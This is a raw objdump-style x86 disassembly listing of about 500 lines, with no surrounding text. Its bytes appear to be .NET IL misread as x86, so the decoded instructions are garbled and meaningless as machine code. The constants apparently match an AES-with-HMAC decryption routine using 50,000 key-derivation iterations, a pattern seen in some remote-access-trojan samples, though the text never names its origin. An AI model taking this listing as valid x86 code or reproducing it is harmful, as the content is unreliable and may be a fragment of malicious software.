  403b8a:	00 06                	add    %al,(%esi)
  403b8c:	00 00                	add    %al,(%eax)
  403b8e:	de 00                	fiadds (%eax)
  403b90:	38 b0 00 00 00 00    	cmp    %dh,0x0(%eax)
  403b96:	06                   	push   %es
  403b97:	72 df                	jb     0x403b78
  403b99:	06                   	push   %es
  403b9a:	00 70 6f             	add    %dh,0x6f(%eax)
  403b9d:	4e                   	dec    %esi
  403b9e:	00 00                	add    %al,(%eax)
  403ba0:	0a 6f ba             	or     -0x46(%edi),%ch
  403ba3:	00 00                	add    %al,(%eax)
  403ba5:	0a 06                	or     (%esi),%al
  403ba7:	72 b3                	jb     0x403b5c
  403ba9:	06                   	push   %es
  403baa:	00 70 6f             	add    %dh,0x6f(%eax)
  403bad:	4e                   	dec    %esi
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	0a 6f be             	or     -0x42(%edi),%ch
  403bb3:	00 00                	add    %al,(%eax)
  403bb5:	0a 28                	or     (%eax),%ch
  403bb7:	42                   	inc    %edx
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	06                   	push   %es
  403bbb:	26 72 e9             	es jb  0x403ba7
  403bbe:	06                   	push   %es
  403bbf:	00 70 28             	add    %dh,0x28(%eax)
  403bc2:	2e 00 00             	add    %al,%cs:(%eax)
  403bc5:	0a 00                	or     (%eax),%al
  403bc7:	00 7e 21             	add    %bh,0x21(%esi)
  403bca:	00 00                	add    %al,(%eax)
  403bcc:	04 28                	add    $0x28,%al
  403bce:	01 00                	add    %eax,(%eax)
  403bd0:	00 2b                	add    %ch,(%ebx)
  403bd2:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd3:	c0 00 00             	rolb   $0x0,(%eax)
  403bd6:	0a 13                	or     (%ebx),%dl
  403bd8:	07                   	pop    %es
  403bd9:	2b 4e 12             	sub    0x12(%esi),%ecx
  403bdc:	07                   	pop    %es
  403bdd:	28 c1                	sub    %al,%cl
  403bdf:	00 00                	add    %al,(%eax)
  403be1:	0a 13                	or     (%ebx),%dl
  403be3:	08 00                	or     %al,(%eax)
  403be5:	11 08                	adc    %ecx,(%eax)
  403be7:	72 b3                	jb     0x403b9c
  403be9:	06                   	push   %es
  403bea:	00 70 6f             	add    %dh,0x6f(%eax)
  403bed:	4e                   	dec    %esi
  403bee:	00 00                	add    %al,(%eax)
  403bf0:	0a 6f ba             	or     -0x46(%edi),%ch
  403bf3:	00 00                	add    %al,(%eax)
  403bf5:	0a 06                	or     (%esi),%al
  403bf7:	72 df                	jb     0x403bd8
  403bf9:	06                   	push   %es
  403bfa:	00 70 6f             	add    %dh,0x6f(%eax)
  403bfd:	4e                   	dec    %esi
  403bfe:	00 00                	add    %al,(%eax)
  403c00:	0a 6f ba             	or     -0x46(%edi),%ch
  403c03:	00 00                	add    %al,(%eax)
  403c05:	0a 28                	or     (%eax),%ch
  403c07:	1f                   	pop    %ds
  403c08:	00 00                	add    %al,(%eax)
  403c0a:	0a 13                	or     (%ebx),%dl
  403c0c:	09 11                	or     %edx,(%ecx)
  403c0e:	09 2c 17             	or     %ebp,(%edi,%edx,1)
  403c11:	00 11                	add    %dl,(%ecx)
  403c13:	08 28                	or     %ch,(%eax)
  403c15:	48                   	dec    %eax
  403c16:	00 00                	add    %al,(%eax)
  403c18:	06                   	push   %es
  403c19:	00 7e 21             	add    %bh,0x21(%esi)
  403c1c:	00 00                	add    %al,(%eax)
  403c1e:	04 11                	add    $0x11,%al
  403c20:	08 6f c2             	or     %ch,-0x3e(%edi)
  403c23:	00 00                	add    %al,(%eax)
  403c25:	0a 26                	or     (%esi),%ah
  403c27:	00 00                	add    %al,(%eax)
  403c29:	12 07                	adc    (%edi),%al
  403c2b:	28 c3                	sub    %al,%bl
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	0a 2d a9 de 0f 12    	or     0x120fdea9,%ch
  403c35:	07                   	pop    %es
  403c36:	fe                   	(bad)
  403c37:	16                   	push   %ss
  403c38:	04 00                	add    $0x0,%al
  403c3a:	00 1b                	add    %bl,(%ebx)
  403c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3d:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403c42:	dc 2b                	fsubrl (%ebx)
  403c44:	00 00                	add    %al,(%eax)
  403c46:	de 13                	ficoms (%ebx)
  403c48:	13 0a                	adc    (%edx),%ecx
  403c4a:	00 11                	add    %dl,(%ecx)
  403c4c:	0a 6f 76             	or     0x76(%edi),%ch
  403c4f:	00 00                	add    %al,(%eax)
  403c51:	0a 28                	or     (%eax),%ch
  403c53:	4a                   	dec    %edx
  403c54:	00 00                	add    %al,(%eax)
  403c56:	06                   	push   %es
  403c57:	00 00                	add    %al,(%eax)
  403c59:	de 00                	fiadds (%eax)
  403c5b:	2a 41 4c             	sub    0x4c(%ecx),%al
  403c5e:	00 00                	add    %al,(%eax)
  403c60:	00 00                	add    %al,(%eax)
  403c62:	00 00                	add    %al,(%eax)
  403c64:	ab                   	stos   %eax,%es:(%edi)
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 86 00 00 00 31    	add    %al,0x31000000(%esi)
  403c6d:	01 00                	add    %eax,(%eax)
  403c6f:	00 13                	add    %dl,(%ebx)
  403c71:	00 00                	add    %al,(%eax)
  403c73:	00 12                	add    %dl,(%edx)
  403c75:	00 00                	add    %al,(%eax)
  403c77:	01 02                	add    %eax,(%edx)
  403c79:	00 00                	add    %al,(%eax)
  403c7b:	00 8d 01 00 00 5b    	add    %cl,0x5b000001(%ebp)
  403c81:	00 00                	add    %al,(%eax)
  403c83:	00 e8                	add    %ch,%al
  403c85:	01 00                	add    %eax,(%eax)
  403c87:	00 0f                	add    %cl,(%edi)
	...
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 01                	add    %al,(%ecx)
  403c95:	00 00                	add    %al,(%eax)
  403c97:	00 fb                	add    %bh,%bl
  403c99:	01 00                	add    %eax,(%eax)
  403c9b:	00 fc                	add    %bh,%ah
  403c9d:	01 00                	add    %eax,(%eax)
  403c9f:	00 13                	add    %dl,(%ebx)
  403ca1:	00 00                	add    %al,(%eax)
  403ca3:	00 12                	add    %dl,(%edx)
  403ca5:	00 00                	add    %al,(%eax)
  403ca7:	01 13                	add    %edx,(%ebx)
  403ca9:	30 0b                	xor    %cl,(%ebx)
  403cab:	00 1a                	add    %bl,(%edx)
  403cad:	01 00                	add    %eax,(%eax)
  403caf:	00 17                	add    %dl,(%edi)
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	11 00                	adc    %eax,(%eax)
  403cb5:	28 c4                	sub    %al,%ah
  403cb7:	00 00                	add    %al,(%eax)
  403cb9:	0a 02                	or     (%edx),%al
  403cbb:	72 b3                	jb     0x403c70
  403cbd:	06                   	push   %es
  403cbe:	00 70 6f             	add    %dh,0x6f(%eax)
  403cc1:	4e                   	dec    %esi
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	0a 6f ba             	or     -0x46(%edi),%ch
  403cc7:	00 00                	add    %al,(%eax)
  403cc9:	0a 28                	or     (%eax),%ch
  403ccb:	43                   	inc    %ebx
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	06                   	push   %es
  403ccf:	28 c5                	sub    %al,%ch
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	0a 6f c6             	or     -0x3a(%edi),%ch
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	0a 0a                	or     (%edx),%cl
  403cda:	06                   	push   %es
  403cdb:	72 03                	jb     0x403ce0
  403cdd:	07                   	pop    %es
  403cde:	00 70 6f             	add    %dh,0x6f(%eax)
  403ce1:	c7 00 00 0a 0b 07    	movl   $0x70b0a00,(%eax)
  403ce7:	28 c8                	sub    %cl,%al
  403ce9:	00 00                	add    %al,(%eax)
  403ceb:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  403cee:	2e 00 00             	add    %al,%cs:(%eax)
  403cf1:	04 2c                	add    $0x2c,%al
  403cf3:	05 38 85 00 00       	add    $0x8538,%eax
  403cf8:	00 20                	add    %ah,(%eax)
  403cfa:	00 01                	add    %al,(%ecx)
  403cfc:	00 00                	add    %al,(%eax)
  403cfe:	72 1f                	jb     0x403d1f
  403d00:	07                   	pop    %es
  403d01:	00 70 14             	add    %dh,0x14(%eax)
  403d04:	d0 0e                	rorb   $1,(%esi)
  403d06:	00 00                	add    %al,(%eax)
  403d08:	02 28                	add    (%eax),%ch
  403d0a:	c9                   	leave
  403d0b:	00 00                	add    %al,(%eax)
  403d0d:	0a 1f                	or     (%edi),%bl
  403d0f:	09 8d 84 00 00 01    	or     %ecx,0x1000084(%ebp)
  403d15:	25 16 16 14 28       	and    $0x28141616,%eax
  403d1a:	ca 00 00             	lret   $0x0
  403d1d:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  403d23:	28 ca                	sub    %cl,%dl
  403d25:	00 00                	add    %al,(%eax)
  403d27:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  403d2d:	28 ca                	sub    %cl,%dl
  403d2f:	00 00                	add    %al,(%eax)
  403d31:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  403d37:	28 ca                	sub    %cl,%dl
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  403d41:	28 ca                	sub    %cl,%dl
  403d43:	00 00                	add    %al,(%eax)
  403d45:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  403d4b:	28 ca                	sub    %cl,%dl
  403d4d:	00 00                	add    %al,(%eax)
  403d4f:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  403d55:	28 ca                	sub    %cl,%dl
  403d57:	00 00                	add    %al,(%eax)
  403d59:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  403d5f:	28 ca                	sub    %cl,%dl
  403d61:	00 00                	add    %al,(%eax)
  403d63:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  403d69:	28 ca                	sub    %cl,%dl
  403d6b:	00 00                	add    %al,(%eax)
  403d6d:	0a a2 28 cb 00 00    	or     0xcb28(%edx),%ah
  403d73:	0a 28                	or     (%eax),%ch
  403d75:	cc                   	int3
  403d76:	00 00                	add    %al,(%eax)
  403d78:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  403d7e:	7e 2e                	jle    0x403dae
  403d80:	00 00                	add    %al,(%eax)
  403d82:	04 7b                	add    $0x7b,%al
  403d84:	cd 00                	int    $0x0
  403d86:	00 0a                	add    %cl,(%edx)
  403d88:	7e 2e                	jle    0x403db8
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	04 08                	add    $0x8,%al
  403d8e:	28 06                	sub    %al,(%esi)
  403d90:	00 00                	add    %al,(%eax)
  403d92:	06                   	push   %es
  403d93:	7e 0b                	jle    0x403da0
  403d95:	00 00                	add    %al,(%eax)
  403d97:	04 7e                	add    $0x7e,%al
  403d99:	10 00                	adc    %al,(%eax)
  403d9b:	00 04 02             	add    %al,(%edx,%eax,1)
  403d9e:	72 27                	jb     0x403dc7
  403da0:	07                   	pop    %es
  403da1:	00 70 6f             	add    %dh,0x6f(%eax)
  403da4:	4e                   	dec    %esi
  403da5:	00 00                	add    %al,(%eax)
  403da7:	0a 6f be             	or     -0x42(%edi),%ch
  403daa:	00 00                	add    %al,(%eax)
  403dac:	0a 7e 1f             	or     0x1f(%esi),%bh
  403daf:	00 00                	add    %al,(%eax)
  403db1:	04 7e                	add    $0x7e,%al
  403db3:	08 00                	or     %al,(%eax)
  403db5:	00 04 7e             	add    %al,(%esi,%edi,2)
  403db8:	0f 00 00             	sldt   (%eax)
  403dbb:	04 7e                	add    $0x7e,%al
  403dbd:	04 00                	add    $0x0,%al
  403dbf:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403dc2:	ce                   	into
  403dc3:	00 00                	add    %al,(%eax)
  403dc5:	0a 00                	or     (%eax),%al
  403dc7:	28 49 00             	sub    %cl,0x0(%ecx)
  403dca:	00 06                	add    %al,(%esi)
  403dcc:	00 2a                	add    %ch,(%edx)
  403dce:	00 00                	add    %al,(%eax)
  403dd0:	13 30                	adc    (%eax),%esi
  403dd2:	02 00                	add    (%eax),%al
  403dd4:	35 00 00 00 18       	xor    $0x18000000,%eax
  403dd9:	00 00                	add    %al,(%eax)
  403ddb:	11 00                	adc    %eax,(%eax)
  403ddd:	73 4d                	jae    0x403e2c
  403ddf:	00 00                	add    %al,(%eax)
  403de1:	0a 0a                	or     (%edx),%cl
  403de3:	06                   	push   %es
  403de4:	72 f1                	jb     0x403dd7
  403de6:	01 00                	add    %eax,(%eax)
  403de8:	70 6f                	jo     0x403e59
  403dea:	4e                   	dec    %esi
  403deb:	00 00                	add    %al,(%eax)
  403ded:	0a 72 37             	or     0x37(%edx),%dh
  403df0:	07                   	pop    %es
  403df1:	00 70 6f             	add    %dh,0x6f(%eax)
  403df4:	4f                   	dec    %edi
  403df5:	00 00                	add    %al,(%eax)
  403df7:	0a 00                	or     (%eax),%al
  403df9:	06                   	push   %es
  403dfa:	6f                   	outsl  %ds:(%esi),(%dx)
  403dfb:	51                   	push   %ecx
  403dfc:	00 00                	add    %al,(%eax)
  403dfe:	0a 28                	or     (%eax),%ch
  403e00:	21 00                	and    %eax,(%eax)
  403e02:	00 06                	add    %al,(%esi)
  403e04:	00 20                	add    %ah,(%eax)
  403e06:	e8 03 00 00 28       	call   0x28403e0e
  403e0b:	10 00                	adc    %al,(%eax)
  403e0d:	00 0a                	add    %cl,(%edx)
  403e0f:	00 2a                	add    %ch,(%edx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 13                	add    %dl,(%ebx)
  403e15:	30 02                	xor    %al,(%edx)
  403e17:	00 3c 00             	add    %bh,(%eax,%eax,1)
  403e1a:	00 00                	add    %al,(%eax)
  403e1c:	18 00                	sbb    %al,(%eax)
  403e1e:	00 11                	add    %dl,(%ecx)
  403e20:	00 73 4d             	add    %dh,0x4d(%ebx)
  403e23:	00 00                	add    %al,(%eax)
  403e25:	0a 0a                	or     (%edx),%cl
  403e27:	06                   	push   %es
  403e28:	72 f1                	jb     0x403e1b
  403e2a:	01 00                	add    %eax,(%eax)
  403e2c:	70 6f                	jo     0x403e9d
  403e2e:	4e                   	dec    %esi
  403e2f:	00 00                	add    %al,(%eax)
  403e31:	0a 72 49             	or     0x49(%edx),%dh
  403e34:	07                   	pop    %es
  403e35:	00 70 6f             	add    %dh,0x6f(%eax)
  403e38:	4f                   	dec    %edi
  403e39:	00 00                	add    %al,(%eax)
  403e3b:	0a 00                	or     (%eax),%al
  403e3d:	06                   	push   %es
  403e3e:	72 49                	jb     0x403e89
  403e40:	07                   	pop    %es
  403e41:	00 70 6f             	add    %dh,0x6f(%eax)
  403e44:	4e                   	dec    %esi
  403e45:	00 00                	add    %al,(%eax)
  403e47:	0a 02                	or     (%edx),%al
  403e49:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4a:	4f                   	dec    %edi
  403e4b:	00 00                	add    %al,(%eax)
  403e4d:	0a 00                	or     (%eax),%al
  403e4f:	06                   	push   %es
  403e50:	6f                   	outsl  %ds:(%esi),(%dx)
  403e51:	51                   	push   %ecx
  403e52:	00 00                	add    %al,(%eax)
  403e54:	0a 28                	or     (%eax),%ch
  403e56:	21 00                	and    %eax,(%eax)
  403e58:	00 06                	add    %al,(%esi)
  403e5a:	00 2a                	add    %ch,(%edx)
  403e5c:	2e 73 cf             	jae,pn 0x403e2e
  403e5f:	00 00                	add    %al,(%eax)
  403e61:	0a 80 21 00 00 04    	or     0x4000021(%eax),%al
  403e67:	2a 1b                	sub    (%ebx),%bl
  403e69:	30 03                	xor    %al,(%ebx)
  403e6b:	00 5a 00             	add    %bl,0x0(%edx)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	19 00                	sbb    %eax,(%eax)
  403e72:	00 11                	add    %dl,(%ecx)
  403e74:	02 28                	add    (%eax),%ch
  403e76:	14 00                	adc    $0x0,%al
  403e78:	00 0a                	add    %cl,(%edx)
  403e7a:	00 00                	add    %al,(%eax)
  403e7c:	03 28                	add    (%eax),%ebp
  403e7e:	d0 00                	rolb   $1,(%eax)
  403e80:	00 0a                	add    %cl,(%edx)
  403e82:	0a 06                	or     (%esi),%al
  403e84:	2c 0b                	sub    $0xb,%al
  403e86:	72 55                	jb     0x403edd
  403e88:	07                   	pop    %es
  403e89:	00 70 73             	add    %dh,0x73(%eax)
  403e8c:	d1 00                	roll   $1,(%eax)
  403e8e:	00 0a                	add    %cl,(%edx)
  403e90:	7a 03                	jp     0x403e95
  403e92:	7e 28                	jle    0x403ebc
  403e94:	00 00                	add    %al,(%eax)
  403e96:	04 20                	add    $0x20,%al
  403e98:	50                   	push   %eax
  403e99:	c3                   	ret
  403e9a:	00 00                	add    %al,(%eax)
  403e9c:	73 d2                	jae    0x403e70
  403e9e:	00 00                	add    %al,(%eax)
  403ea0:	0a 0b                	or     (%ebx),%cl
  403ea2:	00 02                	add    %al,(%edx)
  403ea4:	07                   	pop    %es
  403ea5:	1f                   	pop    %ds
  403ea6:	20 6f d3             	and    %ch,-0x2d(%edi)
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	0a 7d 26             	or     0x26(%ebp),%bh
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	04 02                	add    $0x2,%al
  403eb2:	07                   	pop    %es
  403eb3:	1f                   	pop    %ds
  403eb4:	40                   	inc    %eax
  403eb5:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb6:	d3 00                	roll   %cl,(%eax)
  403eb8:	00 0a                	add    %cl,(%edx)
  403eba:	7d 27                	jge    0x403ee3
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	04 00                	add    $0x0,%al
  403ec0:	de 0b                	fimuls (%ebx)
  403ec2:	07                   	pop    %es
  403ec3:	2c 07                	sub    $0x7,%al
  403ec5:	07                   	pop    %es
  403ec6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec7:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403ecc:	dc 2a                	fsubrl (%edx)
  403ece:	00 00                	add    %al,(%eax)
  403ed0:	01 10                	add    %edx,(%eax)
  403ed2:	00 00                	add    %al,(%eax)
  403ed4:	02 00                	add    (%eax),%al
  403ed6:	2e 00 20             	add    %ah,%cs:(%eax)
  403ed9:	4e                   	dec    %esi
  403eda:	00 0b                	add    %cl,(%ebx)
  403edc:	00 00                	add    %al,(%eax)
  403ede:	00 00                	add    %al,(%eax)
  403ee0:	13 30                	adc    (%eax),%esi
  403ee2:	03 00                	add    (%eax),%eax
  403ee4:	1c 00                	sbb    $0x0,%al
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	0d 00 00 11 00       	or     $0x110000,%eax
  403eed:	02 28                	add    (%eax),%ch
  403eef:	17                   	pop    %ss
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	0a 03                	or     (%ebx),%al
  403ef4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef5:	18 00                	sbb    %al,(%eax)
  403ef7:	00 0a                	add    %cl,(%edx)
  403ef9:	28 4e 00             	sub    %cl,0x0(%esi)
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 d4                	sub    %dl,%ah
  403f00:	00 00                	add    %al,(%eax)
  403f02:	0a 0a                	or     (%edx),%cl
  403f04:	2b 00                	sub    (%eax),%eax
  403f06:	06                   	push   %es
  403f07:	2a 1b                	sub    (%ebx),%bl
  403f09:	30 05 00 25 01 00    	xor    %al,0x12500
  403f0f:	00 1a                	add    %bl,(%edx)
  403f11:	00 00                	add    %al,(%eax)
  403f13:	11 00                	adc    %eax,(%eax)
  403f15:	03 14 fe             	add    (%esi,%edi,8),%edx
  403f18:	01 0a                	add    %ecx,(%edx)
  403f1a:	06                   	push   %es
  403f1b:	2c 0b                	sub    $0xb,%al
  403f1d:	72 9d                	jb     0x403ebc
  403f1f:	07                   	pop    %es
  403f20:	00 70 73             	add    %dh,0x73(%eax)
  403f23:	d5 00                	aad    $0x0
  403f25:	00 0a                	add    %cl,(%edx)
  403f27:	7a 73                	jp     0x403f9c
  403f29:	d6                   	salc
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	0a 0b                	or     (%ebx),%cl
  403f2e:	00 07                	add    %al,(%edi)
  403f30:	1f                   	pop    %ds
  403f31:	20 6a 6f             	and    %ch,0x6f(%edx)
  403f34:	4a                   	dec    %edx
  403f35:	00 00                	add    %al,(%eax)
  403f37:	0a 00                	or     (%eax),%al
  403f39:	73 d7                	jae    0x403f12
  403f3b:	00 00                	add    %al,(%eax)
  403f3d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403f40:	08 20                	or     %ah,(%eax)
  403f42:	00 01                	add    %al,(%ecx)
  403f44:	00 00                	add    %al,(%eax)
  403f46:	6f                   	outsl  %ds:(%esi),(%dx)
  403f47:	d8 00                	fadds  (%eax)
  403f49:	00 0a                	add    %cl,(%edx)
  403f4b:	00 08                	add    %cl,(%eax)
  403f4d:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  403f53:	d9 00                	flds   (%eax)
  403f55:	00 0a                	add    %cl,(%edx)
  403f57:	00 08                	add    %cl,(%eax)
  403f59:	17                   	pop    %ss
  403f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f5b:	da 00                	fiaddl (%eax)
  403f5d:	00 0a                	add    %cl,(%edx)
  403f5f:	00 08                	add    %cl,(%eax)
  403f61:	18 6f db             	sbb    %ch,-0x25(%edi)
  403f64:	00 00                	add    %al,(%eax)
  403f66:	0a 00                	or     (%eax),%al
  403f68:	08 02                	or     %al,(%edx)
  403f6a:	7b 26                	jnp    0x403f92
  403f6c:	00 00                	add    %al,(%eax)
  403f6e:	04 6f                	add    $0x6f,%al
  403f70:	dc 00                	faddl  (%eax)
  403f72:	00 0a                	add    %cl,(%edx)
  403f74:	00 08                	add    %cl,(%eax)
  403f76:	6f                   	outsl  %ds:(%esi),(%dx)
  403f77:	dd 00                	fldl   (%eax)
  403f79:	00 0a                	add    %cl,(%edx)
  403f7b:	00 07                	add    %al,(%edi)
  403f7d:	08 6f de             	or     %ch,-0x22(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 17                	or     (%edi),%dl
  403f84:	73 df                	jae    0x403f65
  403f86:	00 00                	add    %al,(%eax)
  403f88:	0a 0d 00 07 08 6f    	or     0x6f080700,%cl
  403f8e:	e0 00                	loopne 0x403f90
  403f90:	00 0a                	add    %cl,(%edx)
  403f92:	16                   	push   %ss
  403f93:	08 6f e0             	or     %ch,-0x20(%edi)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 8e 69 6f 48 00    	or     0x486f69(%esi),%cl
  403f9e:	00 0a                	add    %cl,(%edx)
  403fa0:	00 09                	add    %cl,(%ecx)
  403fa2:	03 16                	add    (%esi),%edx
  403fa4:	03 8e 69 6f 48 00    	add    0x486f69(%esi),%ecx
  403faa:	00 0a                	add    %cl,(%edx)
  403fac:	00 09                	add    %cl,(%ecx)
  403fae:	6f                   	outsl  %ds:(%esi),(%dx)
  403faf:	e1 00                	loope  0x403fb1
  403fb1:	00 0a                	add    %cl,(%edx)
  403fb3:	00 02                	add    %al,(%edx)
  403fb5:	7b 27                	jnp    0x403fde
  403fb7:	00 00                	add    %al,(%eax)
  403fb9:	04 73                	add    $0x73,%al
  403fbb:	e2 00                	loop   0x403fbd
  403fbd:	00 0a                	add    %cl,(%edx)
  403fbf:	13 04 00             	adc    (%eax,%eax,1),%eax
  403fc2:	11 04 07             	adc    %eax,(%edi,%eax,1)
  403fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc6:	e3 00                	jecxz  0x403fc8
  403fc8:	00 0a                	add    %cl,(%edx)
  403fca:	1f                   	pop    %ds
  403fcb:	20 07                	and    %al,(%edi)
  403fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  403fce:	e3 00                	jecxz  0x403fd0
  403fd0:	00 0a                	add    %cl,(%edx)
  403fd2:	8e 69 1f             	mov    0x1f(%ecx),%gs
  403fd5:	20 59 6f             	and    %bl,0x6f(%ecx)
  403fd8:	e4 00                	in     $0x0,%al
  403fda:	00 0a                	add    %cl,(%edx)
  403fdc:	13 05 07 16 6a 6f    	adc    0x6f6a1607,%eax
  403fe2:	4a                   	dec    %edx
  403fe3:	00 00                	add    %al,(%eax)
  403fe5:	0a 00                	or     (%eax),%al
  403fe7:	07                   	pop    %es
  403fe8:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  403fee:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  403ff5:	00 de                	add    %bl,%dh
  403ff7:	0d 11 04 2c 08       	or     $0x82c0411,%eax
  403ffc:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403fff:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404004:	dc 00                	faddl  (%eax)
  404006:	de 0b                	fimuls (%ebx)
  404008:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  40400b:	09 6f 2d             	or     %ebp,0x2d(%edi)
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 00                	or     (%eax),%al
  404012:	dc 00                	faddl  (%eax)
  404014:	de 0b                	fimuls (%ebx)
  404016:	08 2c 07             	or     %ch,(%edi,%eax,1)
  404019:	08 6f 2d             	or     %ch,0x2d(%edi)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	0a 00                	or     (%eax),%al
  404020:	dc 07                	faddl  (%edi)
  404022:	6f                   	outsl  %ds:(%esi),(%dx)
  404023:	e3 00                	jecxz  0x404025
  404025:	00 0a                	add    %cl,(%edx)
  404027:	13 06                	adc    (%esi),%eax
  404029:	de 0b                	fimuls (%ebx)
  40402b:	07                   	pop    %es
  40402c:	2c 07                	sub    $0x7,%al
  40402e:	07                   	pop    %es
  40402f:	6f                   	outsl  %ds:(%esi),(%dx)
  404030:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404035:	dc 11                	fcoml  (%ecx)
  404037:	06                   	push   %es
  404038:	2a 00                	sub    (%eax),%al
  40403a:	00 00                	add    %al,(%eax)
  40403c:	01 34 00             	add    %esi,(%eax,%eax,1)
  40403f:	00 02                	add    %al,(%edx)
  404041:	00 ad 00 37 e4 00    	add    %ch,0xe43700(%ebp)
  404047:	0d 00 00 00 00       	or     $0x0,%eax
  40404c:	02 00                	add    (%eax),%al
  40404e:	76 00                	jbe    0x404050
  404050:	7e f4                	jle    0x404046
  404052:	00 0b                	add    %cl,(%ebx)
  404054:	00 00                	add    %al,(%eax)
  404056:	00 00                	add    %al,(%eax)
  404058:	02 00                	add    (%eax),%al
  40405a:	2b 00                	sub    (%eax),%eax
  40405c:	d7                   	xlat   %ds:(%ebx)
  40405d:	02 01                	add    (%ecx),%al
  40405f:	0b 00                	or     (%eax),%eax
  404061:	00 00                	add    %al,(%eax)
  404063:	00 02                	add    %al,(%edx)
  404065:	00 1a                	add    %bl,(%edx)
  404067:	00 fd                	add    %bh,%ch
  404069:	17                   	pop    %ss
  40406a:	01 0b                	add    %ecx,(%ebx)
  40406c:	00 00                	add    %al,(%eax)
  40406e:	00 00                	add    %al,(%eax)
  404070:	13 30                	adc    (%eax),%esi
  404072:	03 00                	add    (%eax),%eax
  404074:	1c 00                	sbb    $0x0,%al
  404076:	00 00                	add    %al,(%eax)
  404078:	0d 00 00 11 00       	or     $0x110000,%eax
  40407d:	28 17                	sub    %dl,(%edi)
  40407f:	00 00                	add    %al,(%eax)
  404081:	0a 02                	or     (%edx),%al
  404083:	03 28                	add    (%eax),%ebp
  404085:	1a 00                	sbb    (%eax),%al
  404087:	00 0a                	add    %cl,(%edx)
  404089:	28 50 00             	sub    %dl,0x0(%eax)
  40408c:	00 06                	add    %al,(%esi)
  40408e:	6f                   	outsl  %ds:(%esi),(%dx)
  40408f:	e5 00                	in     $0x0,%eax
  404091:	00 0a                	add    %cl,(%edx)
  404093:	0a 2b                	or     (%ebx),%ch
  404095:	00 06                	add    %al,(%esi)
  404097:	2a 1b                	sub    (%ebx),%bl
  404099:	30 05 00 58 01 00    	xor    %al,0x15800
  40409f:	00 1b                	add    %bl,(%ebx)
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	11 00                	adc    %eax,(%eax)
  4040a5:	03 14 fe             	add    (%esi,%edi,8),%edx
  4040a8:	01 0a                	add    %ecx,(%edx)
  4040aa:	06                   	push   %es
  4040ab:	2c 0b                	sub    $0xb,%al
  4040ad:	72 9d                	jb     0x40404c
  4040af:	07                   	pop    %es
  4040b0:	00 70 73             	add    %dh,0x73(%eax)
  4040b3:	d5 00                	aad    $0x0
  4040b5:	00 0a                	add    %cl,(%edx)
  4040b7:	7a 03                	jp     0x4040bc
  4040b9:	73 49                	jae    0x404104
  4040bb:	00 00                	add    %al,(%eax)
  4040bd:	0a 0b                	or     (%ebx),%cl
  4040bf:	00 73 d7             	add    %dh,-0x29(%ebx)
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4040c7:	08 20                	or     %ah,(%eax)
  4040c9:	00 01                	add    %al,(%ecx)
  4040cb:	00 00                	add    %al,(%eax)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	d8 00                	fadds  (%eax)
  4040d0:	00 0a                	add    %cl,(%edx)
  4040d2:	00 08                	add    %cl,(%eax)
  4040d4:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4040da:	d9 00                	flds   (%eax)
  4040dc:	00 0a                	add    %cl,(%edx)
  4040de:	00 08                	add    %cl,(%eax)
  4040e0:	17                   	pop    %ss
  4040e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e2:	da 00                	fiaddl (%eax)
  4040e4:	00 0a                	add    %cl,(%edx)
